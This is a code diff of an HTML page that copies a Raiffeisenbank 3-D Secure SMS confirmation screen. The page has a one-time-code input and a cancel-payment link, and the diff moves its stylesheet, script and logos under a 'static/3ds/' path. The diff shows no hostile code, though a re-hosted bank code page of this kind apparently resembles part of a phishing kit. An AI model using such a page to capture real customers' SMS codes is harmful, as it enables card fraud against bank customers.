@@ -9,8 +9,8 @@
     <meta name="viewport" content="width=device-width user-scalable=no">
 
 
-    <link type="text/css" href="styles/common_new.css" rel="STYLESHEET">
-    <script type="text/javascript" src="js/sms.js"></script>
+    <link type="text/css" href="static/3ds/styles/common_new.css" rel="STYLESHEET">
+    <script type="text/javascript" src="static/3ds/js/sms.js"></script>
 
 
 </head>
@@ -22,12 +22,12 @@
     <div class="logo_container">
 
         <div class="raif_logo">
-            <img class="logo raif_logo_img" src="img/raiffeisen.png">
+            <img class="logo raif_logo_img" src="&#10; /static/3ds/images/raiffeisen.png&#10;&#9;&#9;&#9;&#9; ">
             <span class="raif_logo_text">Просто. Четко.<br>Компетентно.</span>
         </div>
 
         <div class="vendor_logo">
-            <img class="logo" src="img/visa.png">
+            <img class="logo" src="&#10; /static/3ds/images/visa.png&#10;&#9;&#9;&#9;">
         </div>
     </div>
     <div class="clear"></div>
@@ -65,7 +65,7 @@
         </div>
         <div class="gray_block">
             <div class="list">
-                <input placeholder="Код из SMS" class="in_sms" type="number" pattern="[0-9]*" id="password" name="password" autofocus="">
+                <input placeholder="Код из SMS" class="in_sms" type="number" pattern="[0-9]*" id="password" name="password">
 
                 <div class="line_in_sms">
                     <div class="line line-enter-init"></div>
@@ -85,15 +85,15 @@
             <input type="hidden" id="sendSms" name="sendSms" value="">
             <div class="resend_link" style="display: block;">Отправить код еще раз</div>
 
-            <div class="text_resent" style="display: none;">Повторно код можно будет отправить через 1 сек.</div>
+            <div class="text_resent" style="display: none;">Повторно код можно будет отправить<br>через 1 сек.</div>
 
         </div>
 
-        <div class="cancel_pay">
+        <div class="cancel_pay" style="display: block;">
             <a class="exit_link" href="">Отменить оплату</a>
         </div>
 
-        <div class="info">
+        <div class="info" style="display: block;">
             <div class="footer_info">
                 АО «Райффайзенбанк»<br>
                 Генеральная лицензия Банка России №3292 от 17.02.2015
